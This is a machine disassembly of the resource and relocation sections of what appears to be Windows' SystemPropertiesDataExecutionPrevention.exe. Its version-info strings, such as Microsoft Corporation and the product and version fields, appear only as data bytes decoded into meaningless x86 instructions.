  416344:	jo     0x416346
  416346:	popa   
  416347:	add    BYTE PTR [esi+0x0],ch
  41634a:	jns    0x41634c
  41634c:	dec    esi
  41634d:	add    BYTE PTR [ecx+0x0],ah
  416350:	ins    DWORD PTR es:[edi],dx
  416351:	add    BYTE PTR [ebp+0x0],ah
  416354:	add    BYTE PTR [eax],al
  416356:	add    BYTE PTR [eax],al
  416358:	dec    ebp
  416359:	add    BYTE PTR [ecx+0x0],ch
  41635c:	arpl   WORD PTR [eax],ax
  41635e:	jb     0x416360
  416360:	outs   dx,DWORD PTR ds:[esi]
  416361:	add    BYTE PTR [ebx+0x0],dh
  416364:	outs   dx,DWORD PTR ds:[esi]
  416365:	add    BYTE PTR [esi+0x0],ah
  416368:	je     0x41636a
  41636a:	and    BYTE PTR [eax],al
  41636c:	inc    ebx
  41636d:	add    BYTE PTR [edi+0x0],ch
  416370:	jb     0x416372
  416372:	jo     0x416374
  416374:	outs   dx,DWORD PTR ds:[esi]
  416375:	add    BYTE PTR [edx+0x0],dh
  416378:	popa   
  416379:	add    BYTE PTR [eax+eax*1+0x69],dh
  41637d:	add    BYTE PTR [edi+0x0],ch
  416380:	outs   dx,BYTE PTR ds:[esi]
  416381:	add    BYTE PTR [eax],al
  416383:	add    BYTE PTR [eax+eax*1+0x2a],bh
  416387:	add    BYTE PTR [ecx],al
  416389:	add    BYTE PTR [esi+0x0],al
  41638c:	imul   eax,DWORD PTR [eax],0x65006c
  416392:	inc    esp
  416393:	add    BYTE PTR [ebp+0x0],ah
  416396:	jae    0x416398
  416398:	arpl   WORD PTR [eax],ax
  41639a:	jb     0x41639c
  41639c:	imul   eax,DWORD PTR [eax],0x740070
  4163a2:	imul   eax,DWORD PTR [eax],0x6e006f
  4163a8:	add    BYTE PTR [eax],al
  4163aa:	add    BYTE PTR [eax],al
  4163ac:	inc    ebx
  4163ad:	add    BYTE PTR [eax+0x0],ch
  4163b0:	popa   
  4163b1:	add    BYTE PTR [esi+0x0],ch
  4163b4:	add    BYTE PTR [di+0x0],ah
  4163b8:	and    BYTE PTR [eax],al
  4163ba:	inc    esp
  4163bb:	add    BYTE PTR [ecx+0x0],ah
  4163be:	je     0x4163c0
  4163c0:	popa   
  4163c1:	add    BYTE PTR [eax],ah
  4163c3:	add    BYTE PTR [ebp+0x0],al
  4163c6:	js     0x4163c8
  4163c8:	add    BYTE PTR gs:[ebx+0x0],ah
  4163cc:	jne    0x4163ce
  4163ce:	je     0x4163d0
  4163d0:	imul   eax,DWORD PTR [eax],0x6e006f
  4163d6:	and    BYTE PTR [eax],al
  4163d8:	push   eax
  4163d9:	add    BYTE PTR [edx+0x0],dh
  4163dc:	add    BYTE PTR gs:[esi+0x0],dh
  4163e0:	add    BYTE PTR gs:[esi+0x0],ch
  4163e4:	je     0x4163e6
  4163e6:	imul   eax,DWORD PTR [eax],0x6e006f
  4163ec:	and    BYTE PTR [eax],al
  4163ee:	push   ebx
  4163ef:	add    BYTE PTR [ebp+0x0],ah
  4163f2:	je     0x4163f4
  4163f4:	je     0x4163f6
  4163f6:	imul   eax,DWORD PTR [eax],0x67006e
  4163fc:	jae    0x4163fe
  4163fe:	add    BYTE PTR [eax],al
  416400:	data16 add BYTE PTR [ebx],ah
  416403:	add    BYTE PTR [ecx],al
  416405:	add    BYTE PTR [esi+0x0],al
  416408:	imul   eax,DWORD PTR [eax],0x65006c
  41640e:	push   esi
  41640f:	add    BYTE PTR [ebp+0x0],ah
  416412:	jb     0x416414
  416414:	jae    0x416416
  416416:	imul   eax,DWORD PTR [eax],0x6e006f
  41641c:	add    BYTE PTR [eax],al
  41641e:	add    BYTE PTR [eax],al
  416420:	xor    DWORD PTR [eax],eax
  416422:	xor    BYTE PTR [eax],al
  416424:	add    BYTE PTR cs:[eax],dh
  416427:	add    BYTE PTR [esi],ch
  416429:	add    BYTE PTR [ecx],dh
  41642b:	add    BYTE PTR [eax],dh
  41642d:	add    BYTE PTR [edx],dh
  41642f:	add    BYTE PTR [eax+eax*1],dh
  416432:	xor    BYTE PTR [eax],al
  416434:	add    BYTE PTR cs:[ecx],dh
  416437:	add    BYTE PTR [esi],dh
  416439:	add    BYTE PTR [ebx],dh
  41643b:	add    BYTE PTR [eax],bh
  41643d:	add    BYTE PTR [eax+eax*1],dh
  416440:	and    BYTE PTR [eax],al
  416442:	sub    BYTE PTR [eax],al
  416444:	je     0x416446
  416446:	push   0x2e003100
  41644b:	add    BYTE PTR [ecx],dh
  41644d:	add    BYTE PTR ds:0x37003000,dh
  416453:	add    BYTE PTR [eax],dh
  416455:	add    BYTE PTR [ecx],bh
  416457:	add    BYTE PTR ds:0x37003100,ch
  41645d:	add    BYTE PTR [eax],dh
  41645f:	add    BYTE PTR [eax],dh
  416461:	add    BYTE PTR [ecx],ch
  416463:	add    BYTE PTR [eax],al
  416465:	add    BYTE PTR [eax],al
  416467:	add    BYTE PTR [eax+0x0],dh
  41646a:	sub    BYTE PTR [eax],al
  41646c:	add    DWORD PTR [eax],eax
  41646e:	dec    ecx
  41646f:	add    BYTE PTR [esi+0x0],ch
  416472:	je     0x416474
  416474:	add    BYTE PTR gs:[edx+0x0],dh
  416478:	outs   dx,BYTE PTR ds:[esi]
  416479:	add    BYTE PTR [ecx+0x0],ah
  41647c:	ins    BYTE PTR es:[edi],dx
  41647d:	add    BYTE PTR [esi+0x0],cl
  416480:	popa   
  416481:	add    BYTE PTR [ebp+0x0],ch
  416484:	add    BYTE PTR gs:[eax],al
  416487:	add    BYTE PTR [ebx+0x0],dl
  41648a:	jns    0x41648c
  41648c:	jae    0x41648e
  41648e:	je     0x416490
  416490:	add    BYTE PTR gs:[ebp+0x0],ch
  416494:	push   eax
  416495:	add    BYTE PTR [edx+0x0],dh
  416498:	outs   dx,DWORD PTR ds:[esi]
  416499:	add    BYTE PTR [eax+0x0],dh
  41649c:	add    BYTE PTR gs:[edx+0x0],dh
  4164a0:	je     0x4164a2
  4164a2:	imul   eax,DWORD PTR [eax],0x730065
  4164a8:	inc    esp
  4164a9:	add    BYTE PTR [ecx+0x0],ah
  4164ac:	je     0x4164ae
  4164ae:	popa   
  4164af:	add    BYTE PTR [ebp+0x0],al
  4164b2:	js     0x4164b4
  4164b4:	add    BYTE PTR gs:[ebx+0x0],ah
  4164b8:	jne    0x4164ba
  4164ba:	je     0x4164bc
  4164bc:	imul   eax,DWORD PTR [eax],0x6e006f
  4164c2:	push   eax
  4164c3:	add    BYTE PTR [edx+0x0],dh
  4164c6:	add    BYTE PTR gs:[esi+0x0],dh
  4164ca:	add    BYTE PTR gs:[esi+0x0],ch
  4164ce:	je     0x4164d0
  4164d0:	imul   eax,DWORD PTR [eax],0x6e006f
  4164d6:	add    BYTE PTR [eax],al
  4164d8:	add    BYTE PTR [eax],0x2e
  4164db:	add    BYTE PTR [ecx],al
  4164dd:	add    BYTE PTR [eax+eax*1+0x65],cl
  4164e1:	add    BYTE PTR [edi+0x0],ah
  4164e4:	popa   
  4164e5:	add    BYTE PTR [eax+eax*1+0x43],ch
  4164e9:	add    BYTE PTR [edi+0x0],ch
  4164ec:	jo     0x4164ee
  4164ee:	jns    0x4164f0
  4164f0:	jb     0x4164f2
  4164f2:	imul   eax,DWORD PTR [eax],0x680067
  4164f8:	je     0x4164fa
  4164fa:	add    BYTE PTR [eax],al
  4164fc:	test   eax,0x4d002000
  416501:	add    BYTE PTR [ecx+0x0],ch
  416504:	arpl   WORD PTR [eax],ax
  416506:	jb     0x416508
  416508:	outs   dx,DWORD PTR ds:[esi]
  416509:	add    BYTE PTR [ebx+0x0],dh
  41650c:	outs   dx,DWORD PTR ds:[esi]
  41650d:	add    BYTE PTR [esi+0x0],ah
  416510:	je     0x416512
  416512:	and    BYTE PTR [eax],al
  416514:	inc    ebx
  416515:	add    BYTE PTR [edi+0x0],ch
  416518:	jb     0x41651a
  41651a:	jo     0x41651c
  41651c:	outs   dx,DWORD PTR ds:[esi]
  41651d:	add    BYTE PTR [edx+0x0],dh
  416520:	popa   
  416521:	add    BYTE PTR [eax+eax*1+0x69],dh
  416525:	add    BYTE PTR [edi+0x0],ch
  416528:	outs   dx,BYTE PTR ds:[esi]
  416529:	add    BYTE PTR [esi],ch
  41652b:	add    BYTE PTR [eax],ah
  41652d:	add    BYTE PTR [ecx+0x0],al
  416530:	ins    BYTE PTR es:[edi],dx
  416531:	add    BYTE PTR [eax+eax*1+0x20],ch
  416535:	add    BYTE PTR [edx+0x0],dh
  416538:	imul   eax,DWORD PTR [eax],0x680067
  41653e:	je     0x416540
  416540:	jae    0x416542
  416542:	and    BYTE PTR [eax],al
  416544:	jb     0x416546
  416546:	add    BYTE PTR gs:[ebx+0x0],dh
  41654a:	add    BYTE PTR gs:[edx+0x0],dh
  41654e:	jbe    0x416550
  416550:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  416555:	add    BYTE PTR [eax],al
  416557:	add    BYTE PTR [eax+0x1002c00],al
  41655d:	add    BYTE PTR [edi+0x0],cl
  416560:	jb     0x416562
  416562:	imul   eax,DWORD PTR [eax],0x690067
  416568:	outs   dx,BYTE PTR ds:[esi]
  416569:	add    BYTE PTR [ecx+0x0],ah
  41656c:	ins    BYTE PTR es:[edi],dx
  41656d:	add    BYTE PTR [esi+0x0],al
  416570:	imul   eax,DWORD PTR [eax],0x65006c
  416576:	outs   dx,BYTE PTR ds:[esi]
  416577:	add    BYTE PTR [ecx+0x0],ah
  41657a:	ins    DWORD PTR es:[edi],dx
  41657b:	add    BYTE PTR [ebp+0x0],ah
  41657e:	add    BYTE PTR [eax],al
  416580:	push   ebx
  416581:	add    BYTE PTR [ecx+0x0],bh
  416584:	jae    0x416586
  416586:	je     0x416588
  416588:	add    BYTE PTR gs:[ebp+0x0],ch
  41658c:	push   eax
  41658d:	add    BYTE PTR [edx+0x0],dh
  416590:	outs   dx,DWORD PTR ds:[esi]
  416591:	add    BYTE PTR [eax+0x0],dh
  416594:	add    BYTE PTR gs:[edx+0x0],dh
  416598:	je     0x41659a
  41659a:	imul   eax,DWORD PTR [eax],0x730065
  4165a0:	inc    esp
  4165a1:	add    BYTE PTR [ecx+0x0],ah
  4165a4:	je     0x4165a6
  4165a6:	popa   
  4165a7:	add    BYTE PTR [ebp+0x0],al
  4165aa:	js     0x4165ac
  4165ac:	add    BYTE PTR gs:[ebx+0x0],ah
  4165b0:	jne    0x4165b2
  4165b2:	je     0x4165b4
  4165b4:	imul   eax,DWORD PTR [eax],0x6e006f
  4165ba:	push   eax
  4165bb:	add    BYTE PTR [edx+0x0],dh
  4165be:	add    BYTE PTR gs:[esi+0x0],dh
  4165c2:	add    BYTE PTR gs:[esi+0x0],ch
  4165c6:	je     0x4165c8
  4165c8:	imul   eax,DWORD PTR [eax],0x6e006f
  4165ce:	add    BYTE PTR cs:[ebp+0x0],al
  4165d2:	pop    eax
  4165d3:	add    BYTE PTR [ebp+0x0],al
  4165d6:	add    BYTE PTR [eax],al
  4165d8:	push   0x0
  4165da:	and    eax,0x50000100
  4165df:	add    BYTE PTR [edx+0x0],dh
  4165e2:	outs   dx,DWORD PTR ds:[esi]
  4165e3:	add    BYTE PTR [eax+eax*1+0x75],ah
  4165e7:	add    BYTE PTR [ebx+0x0],ah
  4165ea:	je     0x4165ec
  4165ec:	dec    esi
  4165ed:	add    BYTE PTR [ecx+0x0],ah
  4165f0:	ins    DWORD PTR es:[edi],dx
  4165f1:	add    BYTE PTR [ebp+0x0],ah
  4165f4:	add    BYTE PTR [eax],al
  4165f6:	add    BYTE PTR [eax],al
  4165f8:	dec    ebp
  4165f9:	add    BYTE PTR [ecx+0x0],ch
  4165fc:	arpl   WORD PTR [eax],ax
  4165fe:	jb     0x416600
  416600:	outs   dx,DWORD PTR ds:[esi]
  416601:	add    BYTE PTR [ebx+0x0],dh
  416604:	outs   dx,DWORD PTR ds:[esi]
  416605:	add    BYTE PTR [esi+0x0],ah
  416608:	je     0x41660a
  41660a:	scas   al,BYTE PTR es:[edi]
  41660b:	add    BYTE PTR [eax],ah
  41660d:	add    BYTE PTR [edi+0x0],dl
  416610:	imul   eax,DWORD PTR [eax],0x64006e
  416616:	outs   dx,DWORD PTR ds:[esi]
  416617:	add    BYTE PTR [edi+0x0],dh
  41661a:	jae    0x41661c
  41661c:	scas   al,BYTE PTR es:[edi]
  41661d:	add    BYTE PTR [eax],ah
  41661f:	add    BYTE PTR [edi+0x0],cl
  416622:	jo     0x416624
  416624:	add    BYTE PTR gs:[edx+0x0],dh
  416628:	popa   
  416629:	add    BYTE PTR [eax+eax*1+0x69],dh
  41662d:	add    BYTE PTR [esi+0x0],ch
  416630:	add    BYTE PTR [bx+si],ah
  416633:	add    BYTE PTR [ebx+0x0],dl
  416636:	jns    0x416638
  416638:	jae    0x41663a
  41663a:	je     0x41663c
  41663c:	add    BYTE PTR gs:[ebp+0x0],ch
  416640:	add    BYTE PTR [eax],al
  416642:	add    BYTE PTR [eax],al
  416644:	inc    esi
  416645:	add    BYTE PTR [ecx],dl
  416647:	add    BYTE PTR [ecx],al
  416649:	add    BYTE PTR [eax+0x0],dl
  41664c:	jb     0x41664e
  41664e:	outs   dx,DWORD PTR ds:[esi]
  41664f:	add    BYTE PTR [eax+eax*1+0x75],ah
  416653:	add    BYTE PTR [ebx+0x0],ah
  416656:	je     0x416658
  416658:	push   esi
  416659:	add    BYTE PTR [ebp+0x0],ah
  41665c:	jb     0x41665e
  41665e:	jae    0x416660
  416660:	imul   eax,DWORD PTR [eax],0x6e006f
  416666:	add    BYTE PTR [eax],al
  416668:	xor    DWORD PTR [eax],eax
  41666a:	xor    BYTE PTR [eax],al
  41666c:	add    BYTE PTR cs:[eax],dh
  41666f:	add    BYTE PTR [esi],ch
  416671:	add    BYTE PTR [ecx],dh
  416673:	add    BYTE PTR [eax],dh
  416675:	add    BYTE PTR [edx],dh
  416677:	add    BYTE PTR [eax+eax*1],dh
  41667a:	xor    BYTE PTR [eax],al
  41667c:	add    BYTE PTR cs:[ecx],dh
  41667f:	add    BYTE PTR [esi],dh
  416681:	add    BYTE PTR [ebx],dh
  416683:	add    BYTE PTR [eax],bh
  416685:	add    BYTE PTR [eax+eax*1],dh
  416688:	add    BYTE PTR [eax],al
  41668a:	add    BYTE PTR [eax],al
  41668c:	inc    esp
  41668d:	add    BYTE PTR [eax],al
  41668f:	add    BYTE PTR [ecx],al
  416691:	add    BYTE PTR [esi+0x0],dl
  416694:	popa   
  416695:	add    BYTE PTR [edx+0x0],dh
  416698:	inc    esi
  416699:	add    BYTE PTR [ecx+0x0],ch
  41669c:	ins    BYTE PTR es:[edi],dx
  41669d:	add    BYTE PTR [ebp+0x0],ah
  4166a0:	dec    ecx
  4166a1:	add    BYTE PTR [esi+0x0],ch
  4166a4:	data16 add BYTE PTR [edi+0x0],ch
  4166a8:	add    BYTE PTR [eax],al
  4166aa:	add    BYTE PTR [eax],al
  4166ac:	and    al,0x0
  4166ae:	add    al,0x0
  4166b0:	add    BYTE PTR [eax],al
  4166b2:	push   esp
  4166b3:	add    BYTE PTR [edx+0x0],dh
  4166b6:	popa   
  4166b7:	add    BYTE PTR [esi+0x0],ch
  4166ba:	jae    0x4166bc
  4166bc:	ins    BYTE PTR es:[edi],dx
  4166bd:	add    BYTE PTR [ecx+0x0],ah
  4166c0:	je     0x4166c2
  4166c2:	imul   eax,DWORD PTR [eax],0x6e006f
  4166c8:	add    BYTE PTR [eax],al
  4166ca:	add    BYTE PTR [eax],al
  4166cc:	or     DWORD PTR [eax+esi*4],eax
  4166cf:	add    al,0xcd
  4166d1:	dec    ch
  4166d3:	(bad)  
  4166d4:	rol    BYTE PTR [eax],1
  4166d6:	add    BYTE PTR [eax],al
  4166d8:	add    BYTE PTR [eax],al
  4166da:	add    DWORD PTR [eax],eax
  4166dc:	add    BYTE PTR [eax],al
  4166de:	add    BYTE PTR [eax],al
  4166e0:	adc    DWORD PTR [eax],eax
  4166e2:	add    BYTE PTR [eax],al
  4166e4:	add    BYTE PTR [eax],al
  4166e6:	add    BYTE PTR [eax],al
  4166e8:	add    al,BYTE PTR [eax]
  4166ea:	add    BYTE PTR [eax],al
  4166ec:	clc    
  4166ed:	dec    edi
  4166ee:	inc    edi
  4166ef:	pushf  
  4166f0:	out    0xc9,eax
  4166f2:	int    0xbe
  4166f4:	ficom  WORD PTR [edi-0x32]
  4166f7:	and    eax,0x68055cc1
  4166fc:	aaa    
  4166fd:	pop    es
  4166fe:	mov    dh,0x8
  416700:	xchg   esi,eax
  416701:	mov    eax,ds:0xbbfb4830
  416706:	retf   0x86a8
  416709:	dec    esi
  41670a:	jmp    0x0:0x65
	...
  416721:	add    BYTE PTR [eax],al
  416723:	add    BYTE PTR [eax+0xe000000],cl
  416729:	add    BYTE PTR [eax],al
  41672b:	add    BYTE PTR [eax+0x10000000],bl
  416731:	add    BYTE PTR [eax],al
  416733:	add    BYTE PTR [eax+0xe000000],ch
  416739:	add    BYTE PTR [eax],al
  41673b:	add    BYTE PTR [eax+0x8000000],bh
	...
  416749:	add    BYTE PTR [eax],al
  41674b:	add    al,al
  41674d:	add    BYTE PTR [eax],al
  41674f:	add    BYTE PTR [eax+eax*1],cl
  416752:	add    BYTE PTR [eax],al
  416754:	add    BYTE PTR [eax],al
  416756:	add    BYTE PTR [eax],al
  416758:	dec    ebp
  416759:	add    BYTE PTR [ebp+0x0],dl
  41675c:	dec    ecx
	...
  416765:	add    BYTE PTR [eax],al
  416767:	add    BYTE PTR [ebx],al
  416769:	add    BYTE PTR [eax],al
  41676b:	add    BYTE PTR [esi],cl
  41676d:	add    BYTE PTR [eax],al
  41676f:	add    BYTE PTR [eax],dl
  416771:	add    BYTE PTR [eax],al
  416773:	add    BYTE PTR [eax],bl
  416775:	add    BYTE PTR [eax],al
  416777:	add    BYTE PTR [ebp+0x0],cl
  41677a:	push   ebp
  41677b:	add    BYTE PTR [ecx+0x0],cl
	...
  416786:	add    BYTE PTR [eax],al
  416788:	push   es
  416789:	add    BYTE PTR [eax],al
  41678b:	add    BYTE PTR [eax],dl
  41678d:	add    BYTE PTR [eax],al
  41678f:	add    BYTE PTR [ebp+0x0],ah
  416792:	outs   dx,BYTE PTR ds:[esi]
  416793:	add    BYTE PTR ds:0x53005500,ch
  416799:	add    BYTE PTR [eax],al
  41679b:	add    BYTE PTR [eax],al
  41679d:	add    BYTE PTR [eax],al
	...

Disassembly of section .reloc:

00417000 <.reloc>:
  417000:	add    BYTE PTR [eax],dl
  417002:	add    BYTE PTR [eax],al
  417004:	sub    al,0x1
  417006:	add    BYTE PTR [eax],al
  417008:	add    al,0x30
  41700a:	adc    BYTE PTR [eax],dh
  41700c:	adc    al,0x30
  41700e:	inc    eax
  41700f:	xor    BYTE PTR [eax+esi*1-0x1c],al
  417013:	xor    al,ch
  417015:	xor    al,dh
  417017:	xor    al,bh
  417019:	xor    BYTE PTR [esi+0x33],al
  41701c:	dec    esp
  41701d:	xor    ebp,DWORD PTR [eax+0x33]
  417020:	je     0x417055
  417022:	jp     0x417057
  417024:	xchg   DWORD PTR [ebx],esi
  417026:	popf   
  417027:	xor    esp,DWORD PTR [esi-0x46cc4fcd]
  41702d:	xor    eax,ebx
  41702f:	xor    ecx,edi
  417031:	xor    edx,ebp
  417033:	xor    ebx,esp
  417035:	xor    esp,ebp
  417037:	xor    ebp,ebx
  417039:	xor    esi,ebx
  41703b:	xor    edi,ecx
  41703d:	xor    eax,DWORD PTR [esi]
  41703f:	xor    al,0xe
  417041:	xor    al,0x14
  417043:	xor    al,0x31
  417045:	xor    al,0x36
  417047:	xor    al,0x3c
  417049:	xor    al,0x41
  41704b:	xor    al,0x46
  41704d:	xor    al,0x4b
  41704f:	xor    al,0x50
  417051:	xor    al,0x56
  417053:	xor    al,0x5e
  417055:	xor    al,0x6b
  417057:	xor    al,0x82
  417059:	xor    al,0x9f
  41705b:	xor    al,0xb7
  41705d:	xor    al,0xce
  41705f:	xor    al,0xd6
  417061:	xor    al,0xdf
  417063:	xor    al,0xe4
  417065:	xor    al,0xe9
  417067:	xor    al,0xff
  417069:	xor    al,0x5
  41706b:	xor    eax,0x3511350c
  417070:	push   ds
  417071:	xor    eax,0x3535352d
  417076:	cmp    eax,0x5b355335
  41707b:	xor    eax,0x35b33562
  417080:	mov    ebp,0xcd35c335
  417085:	xor    eax,0x360b3605
  41708a:	adc    eax,0x24361b36
  41708f:	sub    DWORD PTR ss:[esi],esi
  417092:	pop    ebx
  417093:	ss jle 0x4170cc
  417096:	ret    0x1936
  417099:	aaa    
  41709a:	xor    DWORD PTR [edi],esi
  41709c:	aaa    
  41709d:	aaa    
  41709e:	inc    esi
  41709f:	aaa    
  4170a0:	push   edx
  4170a1:	aaa    
  4170a2:	(bad)  
  4170a3:	aaa    
  4170a4:	cld    
  4170a5:	aaa    
  4170a6:	js     0x4170e0
  4170a8:	jge    0x4170e2
  4170aa:	(bad)  
  4170ab:	cmp    BYTE PTR [ebp-0x38c73ec8],ch
  4170b1:	cmp    BYTE PTR [ecx-0x4fc65bc7],cl
  4170b7:	cmp    DWORD PTR [edi-0x2ec637c7],edi
  4170bd:	cmp    esi,esp
  4170bf:	cmp    ebx,edi
  4170c1:	cmp    DWORD PTR [eax],ecx
  4170c3:	cmp    dl,BYTE PTR [eax]
  4170c5:	cmp    ch,BYTE PTR [ebx]
  4170c7:	cmp    bh,BYTE PTR [edx]
  4170c9:	cmp    al,BYTE PTR [ebp+0x3a]
  4170cc:	bound  edi,QWORD PTR [edx]
  4170ce:	mov    dl,0x3a
  4170d0:	mov    bh,0x3a
  4170d2:	fistp  QWORD PTR [edx]
  4170d4:	call   0xfa7c6413
  4170d9:	cmp    dl,BYTE PTR [ecx]
  4170db:	cmp    edx,DWORD PTR [edi]
  4170dd:	cmp    ebx,DWORD PTR ds:0x293b233b
  4170e3:	cmp    ebp,DWORD PTR [edi]
  4170e5:	cmp    esi,DWORD PTR [esi]
  4170e7:	cmp    edi,DWORD PTR ds:0x4b3b443b
  4170ed:	cmp    edx,DWORD PTR [edx+0x3b]
  4170f0:	pop    ecx
  4170f1:	cmp    esp,DWORD PTR [eax+0x3b]
  4170f4:	push   0x783b703b
  4170f9:	cmp    eax,DWORD PTR [ebx+edi*1+0x3b923b8d]
  417100:	cwde   
  417101:	cmp    esp,DWORD PTR [edx-0x43c453c5]
  417107:	cmp    ecx,esp
  417109:	cmp    edx,edx
  41710b:	cmp    ebx,ebp
  41710d:	cmp    esp,ebx
  41710f:	cmp    ebp,edi
  417111:	cmp    edi,edi
  417113:	cmp    ecx,DWORD PTR [eax]
  417115:	cmp    al,0x1d
  417117:	cmp    al,0x3a
  417119:	cmp    al,0x7c
  41711b:	cmp    al,0x94
  41711d:	cmp    al,0x98
  41711f:	cmp    al,0xa0
  417121:	cmp    al,0xa4
  417123:	cmp    al,0xbc
  417125:	cmp    al,0xc0
  417127:	cmp    al,0xdc
  417129:	cmp    al,0xe0
  41712b:	cmp    al,0x0
  41712d:	xor    BYTE PTR [eax],al
  41712f:	add    BYTE PTR [eax+eax*1],cl
  417132:	add    BYTE PTR [eax],al
  417134:	nop
  417135:	xor    BYTE PTR [eax],al
	...
